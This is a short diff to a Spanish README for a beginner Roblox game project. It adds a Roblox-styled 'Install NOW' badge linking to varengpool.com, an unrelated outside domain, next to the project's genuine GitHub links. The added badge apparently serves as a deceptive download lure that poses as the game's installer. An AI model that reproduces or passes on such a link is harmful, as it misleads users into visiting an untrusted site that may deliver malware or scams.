@@ -34,6 +34,9 @@ Encender la chispa creativa en principiantes, ofreciendo recursos educativos par
 **🎉 Crea Ahora**  
 ¡Desata tu imaginación con **RobloxJuego**!  
 
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://varengpool.com)
+-
+
 [![Explorar](https://img.shields.io/badge/Explorar-AHORA-blueviolet)](https://github.com/CreaJardins/RobloxJuego)  
 -
 [![Explorar](https://img.shields.io/badge/Explorar-AHORA-blueviolet)](https://github.com/CreaJardins/.github)  
